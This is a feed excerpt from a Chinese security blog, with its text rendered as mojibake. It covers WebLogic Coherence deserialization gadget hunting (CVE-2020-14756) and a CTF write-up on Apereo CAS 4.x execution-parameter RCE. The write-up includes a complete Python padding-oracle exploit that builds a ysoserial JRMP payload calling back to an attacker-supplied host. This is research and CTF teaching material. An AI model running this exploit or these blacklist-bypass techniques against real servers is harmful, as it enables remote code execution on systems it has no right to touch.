alt="image-20201122194211848.png"><br>æ‰€ä»¥è¿™ä¸ªæ”»å‡»é¢çš„åˆ©ç”¨æ¡ä»¶æ˜¯ï¼š</p><ol><li>ä¸€ä¸ªjava.io.ObjectInputå¼ºè½¬æˆjava.io.DataInputçš„ç‚¹</li><li>å¼ºè½¬æˆjava.io.DataInputåéœ€è¦æœ‰è¿›è¡ŒExternalizableHelper.readObjectçš„æ“ä½œ</li><li>ä¸€ä¸ªå®ç°äº†ExternalizableLiteçš„æ¥å£é«˜å±ç±»</li></ol><p>ä¸è¿‡è¿™å·²ç»è¶³å¤Ÿäº†ï¼Œå› ä¸ºconherenceé‡Œé¢çš„Extractoréƒ½å®ç°è¿™ä¸ªæ¥å£ã€‚<br><img src="image-20201122195930855.png" alt="image-20201122195930855.png"></p><p>ä¸€å¼€å§‹ï¼Œæˆ‘å…¶å®æ˜¯æƒ³æ‰‹å·¥æŒ–çš„ï¼Œé‚£æ®µæ—¶é—´çœŸçš„æ˜¯çœ‹çš„æˆ‘å¤´çš®å‘éº»ï¼Œè€Œä¸”å› ä¸ºå®ç°äº†ExternalizableLiteæ¥å£æ˜¯åœ¨æ˜¯å¤ªå¤šä¹Ÿå¾ˆéš¾ä¿è¯è‡ªå·±å®Œå…¨ä¸é‡ä¸æ¼ï¼Œå¤§å¤šæ•°readExternalé‡Œé¢éƒ½åªæœ‰èµ‹å€¼æ²¡æœ‰åˆ«çš„æ“ä½œï¼Œä¼‘æ¯äº†å‡ å¤©åæˆ‘å†³å®šç”¨é­”æ³•æ‰“è´¥é­”æ³•ï¼Œæ‹¿ä¹‹å‰å†™çš„è‡ªåŠ¨åŒ–å·¥å…·è·‘ã€‚ç»“åˆå†å²æ¼æ´æˆ‘å†³å®šä»¥readExternal(DataInput in)ä¸ºsourceï¼Œä»¥com.tangosol.util.extractor.AbstractExtractor#compareä¸ºsinkå¼€åŠ¨åŒ–è·‘ã€‚</p><p>è·‘äº†ä¸€ä¼šï¼Œä»ä¸€å †è¯¯æŠ¥ä¸­çœ‹åˆ°äº†å¸Œæœ›çš„æ›™å…‰ã€‚<br><img src="image-20201122201724495.png" alt="image-20201122201724495.png"><br>æœ€åè¯æ˜äº†è¿™ä¸ªç¡®å®å¯è¡Œã€‚</p><h2 id="CASE-3"><a href="#CASE-3" class="headerlink" title="CASE 3"></a>CASE 3</h2><p>åœ¨æ‰‹å·¥çœ‹çš„é‚£æ®µæ—¶é—´ï¼Œè™½ç„¶å¤´çš®å‘éº»ä½†å¹¶ä¸æ˜¯æ²¡æœ‰æ”¶è·ï¼Œçœ‹äº†å‡ ä¸ªç‰ˆæœ¬çš„weblogicç»å†äº†â€œå§æ§½,è¿™é‡Œæ€•ä¸æ˜¯æœ‰æ´â€åˆ°â€å§æ§½,è¢«é»‘åå•å…¨é˜²ä½äº†ï¼Œå…¨é˜²å‡ºå»äº†å•Šâ€å¾ˆå¤šæ¬¡åï¼Œæˆ‘éšçº¦è§‰å¾—coherenceå·²ç»å¯ä»¥é€ æˆå±å®³çš„ç‚¹å…¨éƒ¨åŠ å…¥é»‘åå•å¥—é¤äº†ï¼Œä¸ä¼šæœ‰å…¨æ–°çš„é“¾äº†ï¼ˆç­‰è¢«æ‰“è„¸ï¼‰ï¼Œä½†äºŒé˜¶ååºåˆ—åŒ–çš„ç‚¹è¿˜æœ‰æœºä¼šï¼</p><p>è¿™æ¬¡å¼•èµ·æˆ‘æ³¨æ„çš„æ˜¯com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResultã€‚å¯ä»¥çœ‹åˆ°åœ¨ååºåˆ—åŒ–æ—¶å®ƒä¼šè¯»ä¸€ä¸ªBinaryè¿›æ¥ï¼Œç„¶åå¯¹Binaryè¿›è¡Œä¸€ä¸ªfromBinaryçš„æ“ä½œã€‚<br><img src="image-20201123175647803.png" alt="image-20201123175647803.png"><br>æˆ‘æ³¨æ„åˆ°com.tangosol.util.ExternalizableHelper#fromByteArrayä¸­ä¼šæŠŠbyte[]æ•°ç»„é‡å»ºæˆBufferInputè¿›è¡Œååºåˆ—åŒ–ï¼Œå› ä¸ºé‡å»ºæ‰€ä»¥æ²¡æœ‰é»‘åå•è¿‡æ»¤ã€‚<br><img src="image-20201123195621071.png" alt="image-20201123195621071.png"><br><img src="image-20201123195720598.png" alt="image-20201123195720598.png"></p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘æ„Ÿè§‰åˆæˆäº†ã€‚æ„é€ å¥½payloadæ‰“è¿‡å»ï¼Œè¢«weblogicé˜²å‡ºå»äº†ã€‚ä¸€çœ‹ï¼Œæ˜¯2æ‰¾ä¸åˆ°ç±»ï¼Œåé¢ç¡®è®¤äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªç±»åœ¨coherence-jcahe.jaré‡Œé¢ï¼Œè¿™ä¸ªåŒ…å¹¶æ²¡æœ‰è¢«weblogicåŠ è½½è¿›æ¥ã€‚<br><img src="image-20201123202848977.png" alt="image-20201123202848977.png"><br>ä½†æ˜¯å°±è¿™ä¹ˆæ”¾å¼ƒæ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘å†³å®šæ‰¾åˆ°å…¶ä»–fromBinaryçš„è°ƒç”¨ç‚¹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç›´æ¥æ‰“å¼€JD-GUIæœï¼Œå‘ç°SimpleBinaryEntryè¿™ä¸ªçœ‹èµ·æ¥å“ç›¸å¾ˆå¥½ï¼Œå®ƒçš„getValueè°ƒç”¨äº†ExternalizableHelper.fromBinaryæ–¹æ³•è€Œå…¶toStringæ–¹æ³•åˆè°ƒç”¨äº†getValueã€‚<br><img src="image-20201122203856852.png" alt="image-20201122203856852.png"><br><img src="image-20201122203911099.png" alt="image-20201122203911099.png"></p><p>è¿™é‡Œè¿˜æœ‰ç»†èŠ‚éœ€è¦æ³¨æ„m_serializeræ˜¯transientçš„ï¼Œå¦‚æœç”¨BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()æ˜¯ä¸å¯è¡Œçš„ï¼Œåç»­ååºåˆ—åŒ–ä¼šå› ä¸ºm_serializerä¸ºnullè€Œå¤±è´¥ã€‚</p><p>æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯éœ€è¦ä»¥readExternalä¸ºå…¥å£è¿›æ¥ï¼Œ<del>å› ä¸ºreadExternalæ˜¯ä¸å—transienté™åˆ¶çš„ã€‚</del>å› ä¸ºèµ°è¿™ç§ååºåˆ—åŒ–å½“å¯¹è±¡å®ç°äº†SerializerAwareæ—¶ä¼šè‡ªåŠ¨æ’å…¥serializerã€‚<br><img src="image.png" alt="image.png"></p><p><img src="image-20201123210123344.png" alt="image-20201123210123344.png"></p><p>åŠè‡ªåŠ¨åŒ–è·‘äº†ä¸€ä¸‹ï¼Œè™½ç„¶æ²¡æœ‰ç»å¯¹è·‘å‡ºæ¥ï¼ˆæ²¡æœ‰ç”¨æŒ‡é’ˆåˆ†æï¼‰ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå‚è€ƒå·²ç»è¶³å¤Ÿäº†ï¼š<br><img src="image-20201126145458994.png" alt="image-20201126145458994.png"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ç»“ä¸€ä¸‹trik</p><ul><li>åœ¨æŒ–æ–°çš„ä¹‹å‰ï¼Œå¯ä»¥<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">è°ƒç ”å†å²CVEå’Œè¡¥ä¸å­¦ä¹ å‰äººæ€è·¯</a>ã€‚</li><li>æ‰¾äºŒé˜¶ååºåˆ—åŒ–ï¼ŒäºŒé˜¶ååºåˆ—åŒ–å¾€å¾€å‡ºç°åœ¨readExternalå¤„ã€‚äºŒé˜¶ååºåˆ—åŒ–ï¼Œæ—¢å¯ä»¥æ˜¯æ ‡å‡†çš„Byteå­—èŠ‚æµå‹ï¼ˆCVE-2016-0638ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯jrmpå¸¦å¤–åˆ©ç”¨ï¼ˆCVE-2017-3248ï¼‰ï¼Œè¿˜å¯ä»¥æ˜¯ä¸€äº›å˜ç§æ¯”å¦‚è¿™é‡Œçš„cve-2020-14756å¼€å‘è‡ªå®ç°çš„ååºåˆ—åŒ–ï¼Œç”šè‡³å¯ä»¥æ˜¯å¼€å‘åœ¨ååºåˆ—åŒ–æ—¶ä½¿ç”¨äº†è‡ªå·±ç»§æ‰¿çš„ObjectInputStreamé‡Œé¢ä½†æ˜¯é‡Œé¢é‡å†™readResolveæ–¹æ³•ï¼ˆè¦†ç›–äº†åŸæ¥çš„é»‘åå•æ£€æŸ¥ï¼‰ã€‚</li><li>è‡ªåŠ¨åŒ–</li></ul>]]></content>
    
    <summary type="html">
    
      To share my method
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SCTF 2020 ä¸¤é“Login Meé¢„æœŸè§£çš„æ ¸å¿ƒæŠ€æœ¯</title>
    <link href="https://cl0und.github.io/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"/>
    <id>https://cl0und.github.io/2020/07/17/SCTF-2020-%E4%B8%A4%E9%81%93Login-Me%E9%A2%84%E6%9C%9F%E8%A7%A3%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</id>
    <published>2020-07-17T13:39:57.000Z</published>
    <updated>2020-07-17T13:51:17.712Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="Login-Me-cas-4-x-excution-rceï¼ˆé»‘ç›’ï¼‰"><a href="#Login-Me-cas-4-x-excution-rceï¼ˆé»‘ç›’ï¼‰" class="headerlink" title="Login Me - cas 4.x excution rceï¼ˆé»‘ç›’ï¼‰"></a>Login Me - cas 4.x excution rceï¼ˆé»‘ç›’ï¼‰</h2><p>è¯¦ç»†çš„æ¼æ´åˆ†æå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/7032">Apereo CAS 4.X executionå‚æ•°ååºåˆ—åŒ–æ¼æ´åˆ†æ</a>è¿™é‡Œä¸åœ¨èµ˜è¿°ã€‚æ–‡ç« æåˆ°äº†ï¼Œå‰åä¸¤ä¸ªç‰ˆæœ¬åŒºé—´çš„encodeæ–¹æ³•æ˜¯ä¸ä¸€æ ·ã€‚</p><p>åœ¨cas4.x-cas.4.1.5ä¸­çš„åŠ å¯†ä¼ªä»£ç å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = gzip(Java Serialized data)</span><br><span class="line">body = aes128_cbc_encode(key, iv, payload))</span><br><span class="line">header = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10'</span>+iv+<span class="string">'\x00\x00\x00\x06'</span>+<span class="string">'aes128'</span></span><br><span class="line">excution = uuid + b64encode(header + body)</span><br></pre></td></tr></table></figure><p>CAS 4.1.7 ï½ 4.2.Xçš„åŠ å¯†ä¼ªä»£ç å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))</span><br><span class="line">data = b64encode(cipher)</span><br><span class="line">jwsToken = jws.sign(data, jws_key, algorithm=â€˜HS512â€™)</span><br><span class="line">excution = uuid + b64encode(jwsToken)</span><br></pre></td></tr></table></figure><p>å› ä¸ºencodeçš„å˜åŒ–excutionæ˜¯ä¸ä¸€æ ·çš„äº¦å¯ä½œä¸ºåˆ¤æ–­ç‰ˆæœ¬çš„æŒ‡çº¹ã€‚</p><ul><li>cas4.x-cas.4.1.5ä¹‹å‰ç‰¹å¾ï¼šexecution base64è§£ç å‡ºæ¥ä»¥\x00\x00\x00\x22\x00\x00\x00\x10å¼€å¤´ã€‚</li></ul><p><img src="1593850236393-8b8d508a-550c-4e7e-b5ea-9c8c1af56877.png#align=left&display=inline&height=224&margin=%5Bobject%20Object%5D&name=image.png&originHeight=291&originWidth=970&size=78900&status=done&style=none&width=746" alt="image.png"></p><ul><li>4.1.6ä¹‹åç‰¹å¾ï¼šexecutionä¸¤æ¬¡base64è§£ç å‡ºæ¥ä¸æ˜¯ä¹±ç è€Œæ˜¯jwsæ ¼å¼ï¼ˆheader.body.signï¼‰çš„å­—ç¬¦ä¸²ã€‚</li></ul><p><img src="1593850262798-64d1e785-98a0-4bce-ab72-936f97704d11.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=982&size=105001&status=done&style=none&width=746" alt="image.png"><br>è§£å¯†é¢˜ç›®çš„executionä¸éš¾å‘ç°ï¼Œç¯å¢ƒæ˜¯4.x-4.1.5ã€‚æ­¤å¤–çœ‹åˆ°ï¼Œå‰åä¸¤ä¸ªç‰ˆæœ¬çš„encodeçš„æ–¹å¼å”¯ä¸€çš„å·®å¼‚æ˜¯4.1.6ä¹‹åexecutionçš„éœ€è¦è¿›è¡ŒåŠ å¯†ç­¾åï¼Œè”ç³»åˆ°å®ƒä½¿ç”¨çš„æ˜¯aes/cbcè¯´åˆ°è¿™åº”è¯¥å¾ˆç†Ÿæ‚‰äº†å§padding oracleï¼</p><p>è¿™é‡Œpadding oracleï¼Œä»ç„¶éœ€è¦è®²ç©¶æŠ€å·§ï¼Œç›´æ¥ç”Ÿæˆccé“¾ä¸€ç±»çš„payloadè¿›è¡Œpaddingå¤§çº¦éœ€è¦padding 114ç»„å·¦å³æ•°æ®ï¼ˆé¢˜ç›®ä¸¤å°æ—¶é‡å¯ä¸€æ¬¡ï¼Œgadgetè¿˜éœ€è¦fuzzï¼Œè¿™æ˜¯ä¸€ä¸ªéš¾ä»¥å®Œæˆçš„ä»»åŠ¡ï¼‰ï¼Œä½†æ˜¯å¦‚æœç¯å¢ƒèƒ½å‡ºç½‘çš„è¯ç”¨jrmpå°±éœ€è¦padding 14ç»„æ•°æ®å·¦å³äº†ï¼Œè¿™é‡Œè§†ç¯å¢ƒæƒ…å†µä»ç„¶éœ€è¦è·‘1h-3hä¸ç­‰ï¼Œä½†æ˜¯é€šè¿‡çš„åˆ†æè¿‡<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">cve-2018-2628</a>ä¹‹åå‘ç°jrmpçš„payloadçš„å¯ä»¥æ›´çŸ­åªéœ€è¦7ç»„ï¼Œæˆ‘åœ¨åŒåŒºåŸŸçš„é˜¿é‡Œäº‘ä¸Šå¤šçº¿ç¨‹è·‘ä¸åˆ°20åˆ†é’Ÿå°±æœ‰äº†ç»“æœï¼ˆè¿™ä¹Ÿæ˜¯é¢˜ç›®æè¿°Time is Flagçš„æš—ç¤º233333ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jws</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">start_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line"></span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">header_mode = <span class="string">'\x00\x00\x00\x22\x00\x00\x00\x10&#123;iv&#125;\x00\x00\x00\x06aes128'</span></span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">URL= <span class="string">"http://ip:port/login"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"en-US,en;q=0.5"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"JSESSIONID"</span>:<span class="string">"ADF6653ED3808BE63B052BCED53494A3"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64Padding</span><span class="params">(data)</span>:</span></span><br><span class="line">missing_padding = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> missing_padding <span class="keyword">and</span> missing_padding != <span class="number">4</span>:</span><br><span class="line">data += <span class="string">'='</span> * missing_padding</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data)</span>:</span></span><br><span class="line">gzip_compress = zlib.compressobj(<span class="number">9</span>, zlib.DEFLATED, zlib.MAX_WBITS | <span class="number">16</span>)</span><br><span class="line">data = gzip_compress.compress(data) + gzip_compress.flush()</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitFlippingAttack</span><span class="params">(fake_value, orgin_value)</span>:</span></span><br><span class="line">iv = []</span><br><span class="line"><span class="keyword">for</span> f, o <span class="keyword">in</span> zip(fake_value, orgin_value):</span><br><span class="line">iv.append(chr(ord(f) ^ ord(o)))</span><br><span class="line"><span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"><span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span><span class="params">(paramsPost,w)</span>:</span></span><br><span class="line">response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">return</span> w, response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">paddingOracle</span><span class="params">(value)</span>:</span></span><br><span class="line">fakeiv = list(chr(<span class="number">0</span>)*<span class="number">16</span>)</span><br><span class="line">intermediary_value_reverse = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">num = <span class="number">16</span></span><br><span class="line">response_result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>-num+<span class="number">1</span>, num):</span><br><span class="line">jobs = []</span><br><span class="line">pool = ThreadPool(num)</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(j, j + num):</span><br><span class="line">fakeiv[N<span class="number">-1</span>-i] = chr(w)</span><br><span class="line"><span class="comment">#print(fakeiv)</span></span><br><span class="line">fake_iv = <span class="string">''</span>.join(fakeiv)</span><br><span class="line">paramsPost = &#123;<span class="string">"execution"</span>:<span class="string">"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_"</span> + base64.b64encode(header + body + fake_iv + value),<span class="string">"password"</span>:<span class="string">"admin"</span>,<span class="string">"submit"</span>:<span class="string">"LOGIN"</span>,<span class="string">"_eventId"</span>:<span class="string">"submit"</span>,<span class="string">"lt"</span>:<span class="string">"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org"</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">job = pool.apply_async(send_request, (paramsPost,w))</span><br><span class="line">jobs.append(job)</span><br><span class="line"></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> jobs:</span><br><span class="line">j_value, response = w.get()</span><br><span class="line"><span class="comment">#print(response)</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"200"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">response_result.append(j_value)</span><br><span class="line">print(response_result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(response_result) == <span class="number">1</span>:</span><br><span class="line">j_value  = response_result[<span class="number">0</span>]</span><br><span class="line">intermediary_value_reverse.append(chr((i+<span class="number">1</span>) ^ j_value))</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">0</span>, i+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">fakeiv[N-w<span class="number">-1</span>] = chr(ord(intermediary_value_reverse[w]) ^ (i+<span class="number">2</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(fakeiv, intermediary_value_reverse, w, i+<span class="number">1</span>)</span><br><span class="line">print(base64.b64encode(value))</span><br><span class="line">print(e)</span><br><span class="line">exit()</span><br><span class="line">print(fakeiv)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(response_result)</span><br><span class="line">print(<span class="string">"Exit Because count of is "</span> + str(len(response_result)))</span><br><span class="line">exit()</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">5</span> + <span class="string">"sleep"</span> + <span class="string">"="</span>*<span class="number">5</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">intermediary_value = intermediary_value_reverse[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> intermediary_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(payload)</span>:</span></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"><span class="keyword">return</span> pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, <span class="string">'JRMPClient2'</span>, <span class="string">'your_ip:your_port'</span>],stdout=subprocess.PIPE)</span><br><span class="line">payload = popen.stdout.read()</span><br><span class="line">payload = pad_string(compress(payload))</span><br><span class="line"></span><br><span class="line">excution = <span class="string">"input_excution"</span></span><br><span class="line"></span><br><span class="line">body = base64.b64decode(excution)[<span class="number">34</span>:]</span><br><span class="line">header = base64.b64decode(excution)[<span class="number">0</span>:<span class="number">34</span>]</span><br><span class="line">iv = list(header[<span class="number">8</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">fake_value_arr = re.findall(<span class="string">r'[\s\S]&#123;16&#125;'</span>, payload)</span><br><span class="line">fake_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">value = body[<span class="number">-16</span>:]</span><br><span class="line"></span><br><span class="line">payload_value_arr = [value]</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">all_count = len(fake_value_arr)</span><br><span class="line">print(all_count)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fake_value_arr:</span><br><span class="line">intermediary_value = paddingOracle(value)</span><br><span class="line">print(value, intermediary_value)</span><br><span class="line">fakeIv = bitFlippingAttack(intermediary_value, i)</span><br><span class="line">value = <span class="string">''</span>.join(fakeIv)</span><br><span class="line">payload_value_arr.append(value)</span><br><span class="line"></span><br><span class="line">print(count, all_count)</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fakeiv = payload_value_arr.pop()</span><br><span class="line">payload_value_arr.reverse()</span><br><span class="line"></span><br><span class="line">payload = header_mode.format(iv=fakeiv) + <span class="string">''</span>.join(payload_value_arr)</span><br><span class="line">print(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">end_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">print(start_time,end_time)</span><br><span class="line">f = open(<span class="string">'/tmp/cas.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">f.write(base64.b64encode(payload))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>é€šè¿‡jrmpå‡ºæ¥fuzz 